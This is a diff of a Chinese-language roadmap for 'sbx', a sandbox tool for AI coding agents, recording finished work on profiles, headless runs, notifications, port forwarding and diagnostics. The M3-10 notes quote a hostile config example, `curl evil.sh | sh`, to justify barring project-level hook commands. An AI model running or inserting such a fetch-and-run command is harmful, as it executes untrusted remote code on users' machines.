@@ -129,31 +129,43 @@
 ## M3 完整体验
 
 > 完成标准：整夜跑 `/auto-it`，第二天通过通知和 `sbx ls` 掌握全部结果。py-rust 和自定义 Profile 都可用，Codex 可用。
+>
+> **现状（2026-10-09）：除 M3-6（Codex）外全部完成。** 无人值守那条路已经通了——`sbx run -p` 跑完自己停容器、`on_idle`/`on_exit` 发通知、`sbx ls` 的 DENIED 列和 `--all` 看全局、`sbx doctor` 自查。
 
 ### 镜像和 Profile
-- [ ] **M3-1** `assets/profiles/py-rust/Dockerfile`（§5.2 B），并加上对应的语言栈白名单预设。
-- [ ] **M3-2** 自定义 Profile：读取 `.sbx/Dockerfile` 或 `profile.image`；检查是否为 Debian 或 Ubuntu 系，不是就给出明确报错。
-- [ ] **M3-3** 根据项目里的版本文件（`.tool-versions`、`mise.toml`、`.nvmrc`、`.python-version`、`rust-toolchain.toml`）用 mise 自动安装运行时，结果放进 `sbx-mise`。
+- [x] **M3-1** `assets/profiles/py-rust/Dockerfile`（§5.2 B）：rustup stable + clippy/rustfmt + uv，**不装系统 python**（这个 Profile 里 Python 由 uv 负责，再来一个系统解释器只会让"我用的是哪个 python"不好回答）；`assets/allowlist/py-rust.txt` 是对应的白名单预设。实测踩到两件事：`rustup-init` 的 `--component` 要用逗号分隔（写成两个参数会被拒），以及 **`curl | sh` 的退出码是 sh 的**——下载失败时那一层会"构建成功"但什么都没装上（uv 就这么静默缺失过一次），改成先下载再执行、最后 `uv --version` 验一遍。
+- [x] **M3-2** 自定义 Profile。优先级：配置里的 `image` > `<repo>/.sbx/Dockerfile` > 内置 Profile，全部收口在 `imageInputs()`（`image.Inputs` 本来就是"Dockerfile 字节 + hash"的抽象）。`.sbx/Dockerfile` 在信任确认的覆盖范围内，所以"项目自带 Dockerfile"天然要先过 `sbx trust`。
+  - **配置键用顶层 `image` 而不是设计稿写的 `profile.image`**：`profile` 是标量，TOML 里没法再当表用。
+  - 底层镜像不是 Debian/Ubuntu 系时明确报错（ADR 0007），实测 `alpine:latest` 会被挡下并说清原因。检查命令末尾要 `exit 0`——`command -v` 找不到东西会让整条命令非 0 退出，那会被当成"镜像跑不起来"而放行。
+  - **Node 改由 Agent 层负责**：claude 是 npm 包，而 py-rust 这类 Profile 里没有 Node。原来只能得到一句 `exit code: 127`，现在 Agent 层在底层没有 npm 时自己装（design §5.1 本来就把 claude 划在 Agent 层）。
+- [x] **M3-3** mise：Agent 层装 mise，`sbx-mise` volume 挂在 `/home/agent/.local/share/mise`（叠在 sbx-home 之上，运行时是所有 Task 共享的，不该跟着登录态走）。启动前在宿主机侧扫版本文件，有才进容器跑 `mise install`，装不上只警告不拦（项目可能声明了一个 mise 装不了的运行时）。实测：`.nvmrc` 装 node 第一次 51s，第二个 Task 复用 volume 只要 2.8s。
+  - 两个坑：**mise 默认不读 `.nvmrc` 这类"惯用版本文件"**，要 `MISE_IDIOMATIC_VERSION_FILE_ENABLE_TOOLS`；**login shell 会被 `/etc/profile` 重置 PATH**，ENV 里的 shims 目录会被挤掉（design §5.3 的老坑又来一次），所以额外放一份 `/etc/profile.d/10-sbx-mise.sh`。
 - [x] **M3-4** `sbx upgrade`：只重建 Agent 层；支持锁定 Agent 版本。（M1 收尾时提前实现，镜像里关闭自动更新；冒烟测试复用下次 run 的检查）
-- [ ] **M3-5** 依赖遮盖改为由配置驱动（`deps.mask`），并给每个 Profile 设好默认值（`.venv`、`target` 等）。
+- [x] **M3-5** 依赖遮盖由配置驱动（M2 已通）+ **per-Profile 默认值**：web-go → `node_modules`/`.next`，py-rust → `.venv`/`target`。默认值在**四层合并之后**按最终 profile 补上，再和显式写的取并集——profile 可能被后面的层改掉，而列表是并集的，先放 web-go 的默认值再并上 py-rust 的会得到一份四不像（多出来的遮盖项会在 worktree 里凭空建出目录）。
 
 ### Agent
 - [ ] **M3-6** 支持 Codex：生成 `config.toml`，带上 `--dangerously-bypass-approvals-and-sandbox`，支持 `--agent codex` 和 `default_agent`。
-- [ ] **M3-7** headless 模式：`sbx run <task> -p "..."`，输出写入 `run.log`；`sbx logs`。
+- [x] **M3-7** headless 模式：`sbx run <task> -p "..."`（`-p -` 读 stdin），输出写入 `run.log`；`sbx logs <task> [-f] [-n]` 直接读宿主机上的文件，容器停了也看得到。**仍然跑在 tmux 里**（"有没有 Agent 在跑"只有 `tmux has-session` 一个事实来源，另起一条路会让第二次 run 再拉起一个 claude 抢同一棵 worktree），`sbx attach` 因此还能围观 headless 的输出。prompt 走 `gen/prompt.txt`，不进命令行。**跑完由脚本 `kill 1` 停掉容器**（design §3.1 的状态机），释放内存和并发名额；`run.exit` 里是 claude 的退出码，`sbx ls` 显示 `exited(<code>)`，sbx 自己也用这个码退出。Task 正在 running/idle 时 `-p` 直接拒绝（§10.1 第 4 步）。
 
 ### 状态和通知
-- [ ] **M3-8** 注入状态 hooks（M0-5 已验证事件映射：SessionStart/Stop → idle，UserPromptSubmit/PreToolUse → running），`status.json` 区分 running 和 idle。
-- [ ] **M3-9** `sbx ls` 补全显示：idle 状态、`exited(code|oom)`、最后活动时间、被拒请求数，以及 `--all`。
-- [ ] **M3-10** 执行 `on_idle` / `on_exit`：在容器内运行，**`on_idle` 挂在 Notification 事件上**（空闲约 60 秒），自动把 webhook 的主机加进该 Task 的白名单。
+- [x] **M3-8** 注入状态 hooks。**M1 实现时就顺带做完了**（`agent.hookEvents`），而且比设计多两个事件：`Notification`（空闲约 60s）和 `SessionEnd`（claude 自己退出）。M3-7 实测确认 headless 下事件序列同样完整：`SessionStart → UserPromptSubmit → PreToolUse → Stop → SessionEnd`。
+- [x] **M3-9** `sbx ls` 补全显示：idle、`exited(code|oom)`、最后活动时间在 M1 就有了；这次补上 **DENIED 列**（只数"不在白名单"那一类，整张表只读一次代理日志，按各 Task 的 `meta.CreatedAt` 切窗口；读不到就整列 `-`，加 3 秒超时和 `--no-denied`）和 **`--all`**（跨 Workspace，从各 Task 的 meta 还原仓库路径，**不要求当前在 git 仓库里**）。顺带把表格从 tabwriter 换成按显示宽度对齐的 `writeTable`，修掉 CJK 列错位。
+- [x] **M3-10** 执行 `on_idle` / `on_exit`：在容器内运行，`on_idle` 挂 `Notification`、`on_exit` 挂 `SessionEnd`。独立的 `notify.sh`（不塞进 `status.sh`：状态必须永远快且不失败，通知是会挂住的网络 IO），带节流（`notify_throttle`，默认 600 秒）、20 秒超时、永远 exit 0，输出进 `notify.log`。webhook 主机由 `proxy.HostsIn` 从命令里正则扫出来，作为"通知域名"层自动加进白名单；含变量或裸 IP 的会提示手动 `net allow`。
+  - **新增项目层第三条红线**：`on_*` 这类会在容器里执行的命令只能写在全局层或工作区层。原来的两条（密钥键名、绝对路径）拦不住 `on_idle = "curl evil.sh | sh"`，而信任确认时没人逐行读 shell。
+  - **headless 下 `on_exit` 由包装脚本发**，不走 SessionEnd hook：只有它拿得到 claude 的退出码，而 hook 那条会先把节流窗口占掉（实测踩到）。
 
 ### 其他命令
-- [ ] **M3-11** `sbx port <task> <port>`：先确定 R7 的实现方式（转发容器还是重建容器），只绑定到 `127.0.0.1`。
-- [ ] **M3-12** `sbx drop <task>`：输入 task 名确认后，删除分支。
-- [ ] **M3-13** `sbx doctor`：检查 docker、上游代理、登录态、信任状态、`sbx-proxy` 的健康状况（R8）、VM 内存是否足够（R10），以及**交互模式的冒烟测试**（tmux 启动后没有对话框，R9），发现问题时给出修复建议。
+- [x] **M3-11** `sbx port <task> <port>`：**R7 定为 socat 转发容器**（重建 agent 容器会杀掉正在跑的会话，无人值守下不可接受）。`sbx port <task>` 列出已映射的，`--rm` 收回，`done` 时按 `sbx.kind=port` label 一并清理。
+  - 实测踩到：转发容器**不能只接 Task 网络**——那是 `--internal` 网络，docker 不会给只连它的容器做端口映射，`-p` 静默不生效。改成先接默认 bridge 再 `network connect` 到 Task 网络。
+- [x] **M3-12** `sbx drop <task>`：复用 `done` 的全部清理，再删分支；要求**输入 Task 名**确认（`-y` 跳过），确认提示里会说明有多少个提交会一起没掉——分支是这套工具里唯一真正不可逆的东西。
+- [x] **M3-13** `sbx doctor`：表驱动的 8 项检查（docker / vm-memory / upstream / sbx-proxy / login / trust / notify / smoke），每项给 `✓ ! ✗ -` 和一行可直接复制的修复建议。不要求在 git 仓库里（仓库相关的项标"跳过"）；docker 探不到时所有依赖它的项一并跳过，不刷一屏红叉。
+  - 复用现成判定：VM 内存用 `budgetWarning`，代理健康用新增的只读 `proxy.Shared.Health()`（**代理停了但还有 shared Task 在跑 = fail**，R8），登录态用 `authStatus`，冒烟用 `agent.DialogIn`（R9）。
+  - 冒烟优先零成本：有正在跑的 Task 就抓它的 tmux 画面；没有就跳过（`sbx run` 本身每次都会做这项检查）。
+  - **退出码：有 fail 才非 0**；warn 的语义是"能用但该改"，让它挂掉会逼人写 `|| true`。`--strict` 下 warn 也算失败。
 
 ### 发布
-- [ ] **M3-14** 交叉编译 darwin/linux × amd64/arm64；写安装说明。
-- [ ] **M3-15** 写 README：快速上手、团队接入（提交 `.sbx/sandbox.toml`，然后各自 `sbx trust`）、常见问题（被代理拦截、OOM、登录）。
+- [x] **M3-14** `make release`：darwin/linux × amd64/arm64 四个产物打包成 `dist/*.tar.gz` 外加 `SHA256SUMS`，版本号用 `git describe` 注入（`sbx --version`）。`dist/` 已进 .gitignore。**不做 GitHub Actions**（本轮明确不做）。
+- [x] **M3-15** README：快速上手（补了从发布包安装）、团队接入（提交 `.sbx/sandbox.toml` → 队友 `sbx trust` → `sbx run`，并说明这个文件里写不了什么）、常见问题表（OOM、被代理拦、登录过期、`.sbx/` 变动、说不清就 `sbx doctor`）。中英两份都有。
 
 ---
 
